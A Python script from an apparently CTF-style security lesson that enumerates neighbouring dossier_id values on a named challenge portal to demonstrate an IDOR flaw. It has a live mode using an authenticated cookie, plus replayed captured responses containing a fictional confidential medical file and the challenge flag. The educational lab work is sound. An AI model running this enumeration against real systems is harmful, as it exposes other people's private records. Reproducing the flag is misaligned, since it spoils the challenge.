#!/usr/bin/env python3
# recon.py — IDOR (broken object-level authorization) recon capability (Lesson 03).
#
# The deterministic DATA layer, same role as Lessons 01 & 02: it finds shapes and
# classifies behaviour; it NEVER decides success — the WIN oracle is the single judge.
#
# What makes IDOR different from the two lessons before it:
#   L01 (broken access control): you TAMPER with a credential you already hold
#       (forge the `profil` cookie) — zero network, decode-and-edit.
#   L02 (SQL injection): you CRAFT a payload the server mis-parses — active, you
#       poke the input until the query breaks.
#   L03 (IDOR): you craft NOTHING. You change a number in the URL. The server
#       authenticated you correctly (Employé #8472) and then never checked whether
#       #8472 is ALLOWED to read the object you asked for. Authentication ≠
#       authorization. The whole exploit is: the reference is sequential, and it
#       isn't bound to your identity.
#
# So "recon" here is a BOUNDED ENUMERATION, not a payload ladder:
#   1. hold the reference      -> the URL carries ?dossier_id=<int>, a direct ref
#   2. note the session grant  -> we are #8472; the file linked to us is 1042
#   3. walk neighbouring ids   -> a tiny FIXED range, one request each (never a fuzzer)
#   4. classify each response  -> OWN / LEAK / SCOPED / MISSING, through the oracle
#
# The access-control oracle models the check the SERVER forgot to do: for every id
# outside our grant that still returns 200 + content, the server should have said
# 403. Each such response is a LEAK — an object we were never authorized to see.
#
# Like Lesson 02, the network call is an injected dependency (`get`): live mode uses
# `requests` with our authenticated session; the __main__ demo replays REAL captured
# responses (the two dossiers from the hands-on run) — no network, no key, just runs.
#
#   python3 recon.py                                        # offline demo (real captures)
#   python3 -c "import recon; recon.report(recon.recon())"  # live (needs requests + cookie)

import re

TARGET = "https://absences.cyberzerk.fr/"

# --- Who we are, and what we were actually handed. ------------------------------
# The portal authenticates us as Employé #8472 (standard rights) and links ONE file
# to our account. That grant is the ground truth the server fails to enforce.
SESSION_EMPLOYEE = "8472"
GRANTED = {1042}                       # the dossier(s) this session is entitled to

# --- The walk: our own id, then adjacent ones. A tiny hardcoded range, bounded
#     execution, never a fuzzer. "the colleague's file is right before yours."
WALK = [1042, 1041, 1040, 1039]

# --- The WIN oracle: the ONLY thing allowed to say "it worked." -----------------
FLAG_RE = re.compile(r"CyberZerk\{.*?\}")

def win_oracle(body):
    """Deterministic success check. Returns the flag string, or None."""
    m = FLAG_RE.search(body or "")
    return m.group(0) if m else None


# --- Read what a dossier response reveals about its subject ----------------------
#     (corroboration shown in the report; the primary leak signal is the grant.)
_SUBJECT_ID = re.compile(r"[Tt]itulaire\s*:\s*Employ[ée]\s*#(\d+)")
_SUBJECT_NAME = re.compile(r"Employ[ée]\s*:\s*([^<(\n]+?)\s*(?:\(|<|$)")
_CONFIDENTIAL = re.compile(r"CONFIDENTIEL|SECRET\s+M[ÉE]DICAL", re.I)
_TITLE = re.compile(r"Dossier\s*#\d+\s*[—\-–]\s*([^<\n]+)")

def _subject(body):
    body = body or ""
    mid = _SUBJECT_ID.search(body)
    name = _SUBJECT_NAME.search(body)
    title = _TITLE.search(body)
    return {
        "owner_id": mid.group(1) if mid else None,
        "owner_name": name.group(1).strip() if name else None,
        "title": title.group(1).strip() if title else None,
        "confidential": bool(_CONFIDENTIAL.search(body)),
    }


# --- Classify one response against our grant, through the oracle -----------------
def _classify(dossier_id, status, body):
    if status is None:                                 # not fired (offline demo)
        return {"id": dossier_id, "fired": False, "status": None, "verdict": "CANDIDATE",
                "flag": None, "subject": {}, "note": "in the walk — run live to fetch it"}

    subj = _subject(body)
    flag = win_oracle(body)
    mine = dossier_id in GRANTED

    if status == 403:
        verdict = "SCOPED"
        note = "403 — the server enforced ownership here (what SHOULD happen everywhere)"
    elif status == 404 or not (body or "").strip():
        verdict = "MISSING"
        note = "no such dossier"
    elif mine:
        verdict = "OWN"
        note = "our own file — we were granted this one"
    else:
        # 200 + content for an id we were never granted: the missing authz check.
        verdict = "LEAK"
        owner = subj["owner_name"] or (("#" + subj["owner_id"]) if subj["owner_id"] else "another employee")
        note = f"200 OK for an id outside our grant — belongs to {owner}; server never checked ownership"

    if flag and verdict == "LEAK":
        note = "the leaked dossier carries the flag — the oracle fired"

    return {"id": dossier_id, "fired": True, "status": status, "verdict": verdict,
            "flag": flag, "subject": subj, "note": note}


def recon(target=TARGET, get=None, walk=None):
    """Walk the id range and return the structured map."""
    get = get or _live_get(target)
    walk = walk or WALK

    probes = []
    for i in walk:
        status, body, _ = get(i)
        probes.append(_classify(i, status, body))

    leaks = [p for p in probes if p["verdict"] == "LEAK"]
    return {
        "target": target,
        "reference": {"param": "dossier_id", "kind": "sequential integer",
                      "bound_to_identity": False},
        "session": {"employee": SESSION_EMPLOYEE, "granted": sorted(GRANTED)},
        "oracle": {"win": FLAG_RE.pattern,
                   "leak_rule": "HTTP 200 + content for an id not in the session grant"},
        "probes": probes,
        "idor_confirmed": bool(leaks),
    }


# --- Console report -------------------------------------------------------------
_GLYPH = {"OWN": "·", "LEAK": "✗", "SCOPED": "=", "MISSING": "∅", "CANDIDATE": "?"}

def report(m):
    print(f"\n# TARGET   {m['target']}")
    r = m["reference"]
    print(f"\n- REFERENCE  ?{r['param']}=<{r['kind']}>")
    print(f"     bound to your identity? {'yes' if r['bound_to_identity'] else 'NO — you pick the number'}")
    s = m["session"]
    print(f"\n- SESSION    authenticated as Employé #{s['employee']} (standard rights)")
    print(f"     granted dossiers: {s['granted']}   (everything else should be 403)")
    o = m["oracle"]
    print(f"\n- ORACLE     WIN = /{o['win']}/   (the only judge)")
    print(f"     LEAK = {o['leak_rule']}")
    print("\n- WALK       (fixed id range, one request each — not a fuzzer)")
    for p in m["probes"]:
        g = _GLYPH.get(p["verdict"], " ")
        subj = p["subject"] or {}
        tail = f"   ->  {p['flag']}" if p["flag"] else ""
        title = f"  “{subj['title']}”" if subj.get("title") else ""
        conf = "  [CONFIDENTIEL]" if subj.get("confidential") else ""
        print(f"     [{g}] {p['verdict']:<9} dossier_id={p['id']}{title}{conf}{tail}")
        owner = " ".join(x for x in (subj.get("owner_name"),
                 ("#" + subj["owner_id"]) if subj.get("owner_id") else None) if x)
        if owner:
            print(f"             owner: {owner}")
        print(f"             {p['note']}")
    print(f"\n- VERDICT    IDOR {'CONFIRMED' if m['idor_confirmed'] else 'not observed in this range'}")
    print("             authentication proved who you are; nothing checked what you may see.")


# --- Transports: live (requests) and replay (real captured responses) -----------
def _live_get(target):
    def _g(dossier_id):
        import os, requests
        cookie = os.environ.get("ABSENCES_COOKIE", "")   # your authenticated session
        headers = {"Cookie": cookie} if cookie else {}
        r = requests.get(target, params={"dossier_id": dossier_id}, headers=headers, timeout=10)
        return r.status_code, r.text, dict(r.headers)
    return _g

# Fixtures below are REAL responses captured during the hands-on run — not synthetic.
# The session banner is constant (#8472, you); only the dossier body changes.
_BANNER = ('<div class="session">Utilisateur authentifié : '
           '<b>Employé #8472</b> (Droits standards)</div>')

_DOSSIER_1042 = _BANNER + """
<div class="dossier">
  <h2>Dossier #1042 — Demande de Congés</h2>
  <p>Titulaire : Employé #8472</p>
  <p>Statut : REFUSÉ</p>
  <p>Motif du refus RH : "La période de Movember est une période critique pour le
     chiffre d'affaires. Vos congés payés sont reportés à 2028. L'entreprise compte
     sur votre dévouement. C'est la famille !"</p>
</div>"""

_DOSSIER_1041 = _BANNER + """
<div class="dossier confidential">
  <div class="banner">STRICTEMENT CONFIDENTIEL - SECRET MÉDICAL</div>
  <h2>Dossier #1041 — Arrêt Maladie Prolongé</h2>
  <p>Employé : Marc V. (Développeur Senior)</p>
  <p>Titulaire : Employé #8471</p>
  <p>Rapport Médecine du Travail : Épuisement professionnel sévère (Burn-out). Le
     patient décrit des horaires de 70h/semaine, un isolement total et un harcèlement
     moral de la direction ("Vous êtes remplaçable en un claquement de doigts").</p>
  <p>Action RH recommandée : Contester l'arrêt maladie et bloquer les accès
     informatiques du collaborateur pour éviter toute fuite de données.</p>
  <div class="flag">CyberZerk{ID0R_M4n4g3m3nt_T0x1qu3}</div>
</div>"""

_HEADERS = {"set-cookie": "SESSION=REDACTED; path=/", "via": "1.1 Caddy",
            "content-type": "text/html; charset=UTF-8"}

_REPLAY = {
    1042: (200, _DOSSIER_1042, _HEADERS),
    1041: (200, _DOSSIER_1041, _HEADERS),
    # 1040 / 1039 were not captured offline -> CANDIDATE (run live to fetch).
}

def _replay_get(dossier_id):
    return _REPLAY.get(dossier_id, (None, None, {}))


if __name__ == "__main__":
    print("=== recon.py — DEMO (offline; real captured responses) ===")
    report(recon(get=_replay_get))
    print("\n(Ids marked CANDIDATE weren't captured offline — the same missing-authz")
    print(" rule predicts 1040, 1039 … are readable too. Run live to fetch them.)")
